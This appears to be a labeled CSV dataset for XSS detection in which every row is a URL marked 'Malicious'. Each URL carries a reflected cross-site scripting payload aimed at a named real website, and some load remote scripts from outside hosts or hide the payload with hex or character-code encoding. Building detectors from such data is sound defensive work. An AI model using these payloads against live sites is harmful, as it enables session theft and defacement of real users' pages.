Payloads,Class
http://www.greenpeace.fr/incinerateurs/list.php?list_name=pays-de-la-loire&amp;filter_dpt=/&quot;&gt;&lt;script&gt;ale<br>rt(1)&lt;/script&gt;&lt;script src=http://atmoner.com/xss.atmon3r.js&gt;&lt;/script&gt;,Malicious
http://izuminoa.x-y.net/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%6<br>9%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31<br>%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%<br>2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
"http://libguides.bc.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';alert(str<br>ing.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromcharcode(88<br>,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://ono.sunyconnect.suny.edu:4820/f/?func=find-a&amp;find_code=wau&amp;request=asdf%22/%3e%3cscript%3eale<br>rt%281%29;%3c/script%3e,Malicious
http://blogs.ibibo.com/blog_search.php/?sobject=error%22%3e%3cscript+language%3djavascript%3ealert%28document.cookie%29%3b%3c%2fscript%3e,Malicious
http://www.bbq.com/picviewer.html?image=http://vuln.xssed.net/thirdparty/scripts/python5.gif&amp;item_id<br>=494&amp;item_name=meco%20smokers%20-%205030%20black%20electric%20smoker%20%27%22%3e%3c/title%3e%3cscrip<br>t%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3eand%20g<br>rill,Malicious
http://www.gardensandplants.com/shopping/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyb<br>er-unity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.pc-koubou.jp/pc/game.php?a=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narc<br>oticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://jqueryui.com/themeroller/#ffdefault=""/><script>alert(/xss: vijayendra/)</script>",Malicious
http://www.ville-noumea.nc/phototheque/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.melbourneitdbs.dk/news.php?article=1&amp;title=the%20sunrise%20phase%20of%20.sg%20idns%20is%2<br>0underway&amp;year=2010&amp;month=06%22%3e%3cscript%3ealert(/ccc/)%3c/script%3e,Malicious
http://horoscopes.rambler.ru/index.html/%22%3e%3cbody%20onload=%22document.write('%3ccenter%3e%3ch1%<br>3e%3cfont%20color=red%3exss%5c'ed%20by%20babaconda=)')%22%3e,Malicious
http://gallery.fitec.org.nz/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.strafvollzugsarchiv.de/index.php?action=archiv_suchen&amp;suchen_begriff=%22%3e%3cscript%3eal<br>ert(1)%3c%2fscript%3e,Malicious
http://ibs.colorado.edu/grants/profile.php?personid=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://careers.riyadbank.com/ar/job-search-results/?q=%22%3e%3ciframe%20src=%22http://xssed.com%22%3<br>e,Malicious
http://www.opensecrets.org/indivs/donor_lookup.php?name=%3cscript%3ealert(document.cookie);%3c/scrip<br>t%3e,Malicious
http://moteur-auracom.com/cgi-bin/aurweb.exe/gouv/all?crita=%3cscript%3ealert%28%27xylitol+was+here+<br>%21%27%29%3c%2fscript%3e,Malicious
http://www.india-forums.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.prison.net/worldcharts/charts/songs/?query='%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
http://www.lib.muohio.edu/onlineref/index.php?category=health%22%3e%22%3e/r0hit/%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/style.js%3e%3c/script%3e,Malicious
http://rubyforge.org/account/register.php?unix_name=%22%3e%3ciframe%20src=http://google.com%3e,Malicious
http://radiokub.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h<br>1&gt;&lt;/marquee&gt;,Malicious
http://www.liteseek.com/search.php?username=makaren&amp;query=%22%3e%27%3e%3cscript%3ealert(123)%3c/scri<br>pt%3e,Malicious
http://my.blackberry.com/mbb-registration-success!emailvalidate.jspa?email=%22%3e%3cscript%3ealert%2<br>8/securitylab.ir/%29%3c/script%3e,Malicious
http://www2ftp.de/cgi-www2ftp/work/ftpman.pl?javacheck=false&amp;command=login&amp;logout=www2ftp.de/logout.<br>html&amp;server=&amp;user=%3c/script%3e%3ciframe%20src=http://kusomiso.com/xss.html%20%3c&amp;password=&amp;advanced<br>=checked&amp;port=21,Malicious
http://liste.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.turkhane.net/?q=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.lcweb.loc.gov/folklife/teachers/org2_list.php?org1_name=museum+of+international+folk+art&quot;<br>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.logementsocialdurable.fr/formation.php?id=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://support.kaspersky.fr/index.php?findstrings=%22%3e%3cscript%3ealert(document.cookie)%3c%2fscri<br>pt%3e,Malicious
http://client4.addonchat.com/scwho.pl?id=430&amp;subroom=435&amp;boldadmin=0&amp;comma=1&amp;countonly=0&amp;chatbg=fff5<br>c2&amp;chatusr=3333ff&amp;subroomcolor=000000&amp;chatadmusr=3333ff&amp;nousermsg=%3cscript%3ealert(%22xssed%22)%3c/<br>script%3e,Malicious
http://monitor.ibb.gov/accesswatch/getphpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://www.touslesemplois.com/les_offres_cherche.php?emploi=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2<br>fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;i1_x=ok,Malicious
http://www.ca.sandia.gov/hitempthermo/cgi-bin/chemkin.cgi?page=results&amp;id=%3cscript%3ealert('i-lande<br>t')%3c/script%3e,Malicious
http://gis.cstone.idv.tw/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%<br>70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%3<br>2%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c<br>%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.fmprc.gov.cn/wjb/eng_search.jsp?siteid=97&sitename=pk_eng&sw=%22%3e%3cscript%3ealert(%2fxss+by+rohit+bansal%2f)%3c%2fscript%3e&select=1&submit=search,Malicious
http://internetmap.info/cgi-bin/engine.cgi?a=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3c<br>script%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20<br>was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernauti<br>ca.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespa<br>na.es/xss.html%20%3c,Malicious
http://www.netfast.com/xq/asp/qx/search_bykeyword.asp?searwords=&quot;&gt;&lt;script&gt;alert(&quot;kurtefendy&quot;)&lt;/scrip<br>t&gt;,Malicious
http://sh2.yahoo.edyna.com/root/suspend.asp?company_name=%ac%d3%aba%af%f9%b7%7e%a6%b3%ad%ad%a4%bd%a5<br>q&amp;adm_email=imper888%40ms37.hinet.net&amp;tel1=02-2501-0077%2313&amp;fax1=02-2501-0577&amp;addr1=%aaq%a6%bf%b8%f<br>4313%ab%d14%b8%b9&amp;closed_msg=&quot;&gt;&lt;script&gt;alert('cyber//35r4-f0r3v3r')&lt;/script&gt;,Malicious
http://yourhome.honeywell.com/yourhome/applications/search/search.aspx?searchstring=%22%20%27%20foo%<br>20%3e%3cscript%3ealert(/xssed/)%3c/script%3e,Malicious
http://www.100bestbuy.com/product.php?id=2977%22%3e%3cscript%3ealert%28%22xss--g4h%22%29%3c/script%3<br>e,Malicious
http://www.xczsw.gov.cn/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.guru.net.nz/games/gtavc/?album=vehicles&amp;pic='%22%3e%3ciframe%20src=http://xssed.com%3e&amp;fu<br>ll=y,Malicious
http://webmodis.iis.u-tokyo.ac.jp/iis/qkm/index.php?filename=%27%22%3e%3c/title%3e%3cscript%3ealert%<br>281337%29%3c/script%3e&amp;index=0&amp;nwlat=&amp;nwlon=&amp;selon=&amp;selat=&amp;email=&amp;create=submit+request,Malicious
https://ab-dep-op-elogbook.web.cern.ch/ab-dep-op-elogbook/elogbook/elogbook.php?lgbk=110&amp;date=');%3e<br>%3cscript%3ealert(1);%3c/script%3e&amp;shift=1,Malicious
"http://www.president.ir/en/view.php?p=1&amp;m=0&amp;c=35&amp;y=2007&amp;m=%22%3cscript%3edocument.write(string.fromc<br>harcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,65,104,109,97,100,105,110,101,106,97,1<br>00,32,112,64,119,110,100,46,32,89,111,117,32,99,97,110,32,115,117,99,107,32,109,121,32,46,46,46,34,4<br>1,59,60,47,115,99,114,105,112,116,62,60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,5<br>8,47,47,119,119,119,46,98,114,101,105,116,98,97,114,116,46,99,111,109,47,97,114,116,105,99,108,101,4<br>6,112,104,112,63,105,100,61,48,54,49,50,49,49,49,51,48,50,53,55,46,121,112,102,107,122,112,53,98,38,<br>115,104,111,119,95,97,114,116,105,99,108,101,61,49,34,32,119,105,100,116,104,61,34,49,48,48,48,112,1<br>20,34,32,104,101,105,103,104,116,61,34,49,50,48,48,112,120,34,62,60,47,105,102,114,97,109,101,62))%3<br>c/script%3e",Malicious
http://www.yaoyuan.com/search.php?type=zvz%27%27%22%3e%3cimg%20src=k.png%20onerror=alert(/xss/.sourc<br>e)%20/%3e,Malicious
"http://pqasb.pqarchiver.com/sptimes/offers.html?message=the%20requested%20document%20format,%20%22%3<br>e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,%20is%20not%20recognized.",Malicious
http://www.feuerbestattungen-kosche.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.114.vnet.cn/search_web.html?id=9&amp;bt=o&amp;st=web&amp;fm=pro&amp;ec=gb2312&amp;kw=%22%3e%3cmarquee%3ede<br>faced+by+sponsfull&amp;imagefield.x=0&amp;imagefield.y=0,Malicious
http://www.arabicphotostock.com/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.johncassidyphoto.co.uk/gallery.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c<br>/script%3e,Malicious
http://www.marad.dot.gov/exit.asp?url=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.muslimbrotherhood.co.uk/article.php?id=29507%22%3e%3cscript%3ealert%28document.cookie%29%<br>3c/script%3e,Malicious
http://cc.domaindlx.com/quant/goster.asp?baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://minashot.net/cgi-bin/report_yhet79849162rae56fd/9tq16f80gd7.cgi?mode=change&amp;no=9'%3e%22%3e'%3<br>e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www.net-security.org/books.php?cat=1%22%3e%3cscript%3ealert('the_miller')%3c/script%3e&amp;url=ht<br>tp://vital.h.com.ua,Malicious
http://www.usamimi.info/~ryouchi/pagerank_img/index.php?u=%22%3e'%3e%22%3c'%3c%3cscript%3e%3c/script<br>%3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.logitech.com/en-za/support-downloads?modelsearch=yes&amp;modelnumber=%22/%3e%3cscript%3ealert<br>%28%22xss%3a+vijayendra%22%29%3c/script%3e,Malicious
http://www.leprechaunsloot.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,Malicious
https://www.adobe.com/login/login.jsp?currentsection=try&amp;next=/products/tryadobe/download.jsp?ftpid=<br>%22%20name=%22next%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.yaoun.com/caigou.asp?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious
http://yahoo.rogers.com/yahoo/spotlight/tv_stevie.jsp?id=2008/03/20080303&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;&quot;&gt;&lt;script&gt;alert(&quot;methodman&quot;)&lt;/script&gt;&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://pixrat.ibibo.com/picture/tag?id=%22%27%3e%3ch1%3e%3cmarquee%3ecueballr%3c%2fmarquee%3e%3c%2fh<br>1%3e&amp;opt=tag&amp;commit=search,Malicious
http://uni17.ogame.de/game/redir.php?url=http://%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious
"http://gobuypills.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious
http://www.eynesil.org.tr/galeris/tr/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://bb.sameha.net/test/?id=1ch&amp;t=1&amp;edit='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious
http://www.haykir.net/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e,Malicious
https://secure.gmpartsdirect.com/secure/login.cfm?action=%22%3e%3cscript%3ealert(document.cookie)%3c<br>%2fscript%3e,Malicious
http://www.kaijipr.or.jp/cgi-bin/diary/diary.cgi?year=2007&amp;month=9&amp;day=5'%3e%22%3e%3cscript/src=http<br>://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.alwan.co.il/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e=local&amp;page=7,Malicious
http://www.gcba.gov.ar/areas/turismo/faqs/index.php?lang=es=%22%3e%3ch1%3eexploit%20some%20xss%3c/h1<br>%3e=%22%3e%3ciframe%20src=http://www.google.com/%3e%3c/iframe%3e,Malicious
http://www.clicfolio.com/clicfolio/curriculum.php?id=7934%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.mercadolibre.com.do/dominicana/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://www.simonsig.co.za/about.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://biblioteca.carregal-digital.pt/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;max<br>trm=20&amp;trmcols=2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://corp.bankofamerica.com/public/search/search%3cscript%3ealert(%22xss%22)%3c/script%3e.do,Malicious
http://by.ru/cat.cgi?query=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.govexec.com/calendar/?mode=insertform%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.realmadrid.com/cs/satellite/es/1202808681841/aforovip/1202808681841.htm?idfinal=%31%32%30<br>%32%38%31%30%31%39%38%35%36%31%74%6f%63%6f%74%6f%2d%2d%3e%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%<br>74%74%70%3a%2f%2f%78%73%73%65%64%2e%63%6f%6d%22%3e%3c%21%2d%2d,Malicious
http://fullddl.net/search.php?q=%3cmarquee%3egurus%3c/marquee%3e,Malicious
"http://dawnofdiscoverygame.us.ubi.com/pc/media1404.php?gallery=media1404&amp;picture=%27%22%3e%3cscript%<br>3ealert%28string.fromcharcode%2888,83,83,69,68,32,98,121,32,86,105,112,101,114,46,97,84%29%29;docume<br>nt.write%28string.fromcharcoe%2860,97,32,104,114,101,102,61,34,104,116,116,112,58,47,47,120,115,115,<br>101,100,46,99,111,109,47,97,114,99,104,105,118,101,47,97,117,116,104,111,114,61,86,105,112,101,114,4<br>6,97,84,47,34,62,88,83,83,69,68,60,47,97,62%29%29;%3c/script%3e",Malicious
http://www.courseadvisor.com/search/no_results?search_input=foobar%22%3e%3cscript%3ealert(%27xssed%2<br>7)%3c/script%3e,Malicious
http://b.www1.xwjp.com/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso<br>.com%22)%3c/script%3e,Malicious
http://www.mitschkaconsulting.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.annuairedesentreprisesadie.org/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://airtel.onspeednx.com/nx/search/?q=www.%3cscript%3ealert(%27cueballr%27)%3c/script%3e&amp;a=1005&amp;s<br>=1&amp;d=1,Malicious
http://compinfo.ge/index.php/%22%3e%3cscript%3ealert(/dd/)%3c/script%3e,Malicious
http://xesearch-int.xe.com/find.html?id=78955197&amp;pageid=r&amp;mode=all&amp;nsb=true%22%3e%3cscript%3ealert%2<br>8document.cookie%29%3c/script%3e&amp;n=0&amp;query=xss&amp;q=%3cscript%3ealert%28document.cookie%29%3c%2fscript%<br>3e&amp;type=xe.com &lt;- xss&amp;script insertion,Malicious
http://tools.cisco.com/elearning/knet/faq/jsp/faqcontroller.jsp?motclef=%3c%3cscript%3ealert(%22resistan<br>,Malicious
http://www.familienet.dk/galleri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ec2-75-101-136-236.compute-1.amazonaws.com/search.php?cx=017782839116229869462%3aiaqf3zzj87m&amp;<br>cof=forid%3a10&amp;ie=utf-8&amp;q=%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%2fxss.js%3e%3c%2fscript%3e&amp;sa.x=<br>11&amp;sa.y=12&amp;siteurl=%3cscript%20src=http://ha.ckers.org/xss.js%3e%3c/script%3e#204,Malicious
http://jobsearch.studentjobs.gov/jobsearch.asp?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.xas.com/index.php?query=2usjnr7w6gm0mzrbxb8aaohoid64levwdbze7hx0%252b1vydarwvqeyxejz5ot8f<br>ziewx6r1dn2m%252bbobzbut%252fj%252bdk0tpwoipe4r%252b8sicjimiofxi1cwns77nuqp354bf%252fwclcvosy0g2zmzr<br>cy1osqgw%252f%252ftwuag9xfjdkebojxefk4tzoyu9cd6sjfb4whe6igta53bdggydoii3h1cyqvhhgraovno0%252fulq0ahc<br>jwawbpjbfurul%252bjuuj4s%252fz1fdi7kbwzxd33acgv4z%252fpeahgkusu2k5fhwhm%252bga9mmknl1mx4x1xyb3zmvntx<br>scxdszuq1pruw5jcl%252b0s7yrxadjkwi52fj5tjvsgr4hmfytk2sgybajwaxo0e0%253d&amp;searchkeywords=%27%22%3e%3c%<br>2ftitle%3e%3cscript%3ealert%281337%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3<br>e%3c%2fmarquee%3e,Malicious
http://www.diyarbakirsanat.org/diyarbakir.asp?lid=%3e%3ctitle%3elost%20in%20love%20:)%3c/title%3e%3c<br>script%3edocument.write('cyber-emperor@hotmail.com')%3c/script%3e%3cmarquee%3e%3ch1%3hacked%20by%20c<br>yber%20|%20ferda%20forever%3c/h1%3e%3c/marquee%3e%3cimg%20src=%22http://img246.imageshack.us/img246/<br>9121/wattarmadt1.jpg%22%3e%3cscript%3ealert%20('cyber%20was%20here')%3c/script%3e%3c,Malicious
http://www.turkishdailynews.com.tr/article.php?enewsid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://techcenter.lanxess.com/trp/emea/en/literature/new/new.jsp?orig=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://www.tisi.go.th/cgi-bin/syscer/14000com_all.pl?isicsymb=242&amp;isicname=%27%3e%22%3e%3cscript%2fs<br>rc%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://www.power99.net/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tierschutz-halle.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://customersupport.ea.com/loginapp/login.do?curl=&quot;&gt;&lt;script&gt;alert(/shocker @<br>www.shockingsoft.com/)&lt;/script&gt;,Malicious
https://expand.snowballeffect.net:8442/plesk/unilogin.php?login=%22%3e%3cscript%3ealert%28%22documen<br>t.cookie%22%29%3c/script%3e,Malicious
http://www.visa.com.ru/?id=130&amp;txt1=%3cscript%3ealert('the_miller')%3c/script%3e&amp;x=&amp;y=,Malicious
http://dpea.moc.gov.ir/showresult.asp?number=1&amp;query=1%22/%3e%3cscript%3ealert%28/securitylab.ir/%29<br>%3c/script%3e,Malicious
http://support.clean-mx.de/clean-mx/viruses.php?domain=%27%22%3e%3c/title%3e%3cscript%3ealert%281337<br>%29%3c/script%3e&amp;submit=query,Malicious
http://www.onlinenic.com/faq/detail.php?id=32&amp;f_id=54%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
https://www.adobe.com/cfusion/membership/index.cfm?loc=en%5fus&amp;nf=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.globalsecurity.org/security/profiles/generate_group_activities.php?name=&quot;&gt;&lt;/a&gt;&lt;img src=x<br>onerror=alert(1);&gt;&lt;iframe src=http://google.com&gt;,Malicious
http://bishart.net/image.php?id=127%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.lowcarbgourmet.com/store/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-un<br>ity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://observatory2.angkasa.gov.my/langkawibrowserastronomy/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(<br>'xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.juegosdiarios.com/buscador/%22%3e%3cmarquee%3edefaced%20by%20sponsfull%3c/marquee%3e.html;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious
http://manga.animea.net/search.html?q=%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;imagefie<br>ld.x=0&amp;imagefield.y=0,Malicious
http://tampafl.gov/programs_and_services/_online_tools/search.asp?client=tampagov&amp;proxystylesheet=ta<br>mpagov&amp;output=xml_no_dtd&amp;site=tampagov&amp;q=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scripts<br>/hotpockets.js%3e,Malicious
http://www.okuluygulamalari.net/okuluygulamalari.net/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert<br>(document.cookie)&lt;/script&gt;&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://fish59.idv.tw/blog/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%<br>32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2<br>c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.recrulex.com/emploi-juridique/resultats-recherche-annonces.asp?poste=&amp;specialisation=&amp;zon<br>e=&amp;freesearch=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%<br>3c%2fh1%3e%3c%2fmarquee%3e&amp;submit.x=41&amp;submit.y=15,Malicious
http://www.bravenet.com/hosting/get-domain.php?domain=%22%3e%3cmarquee%3e%3ch1%3edefaced+by+ironzorg<br>%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
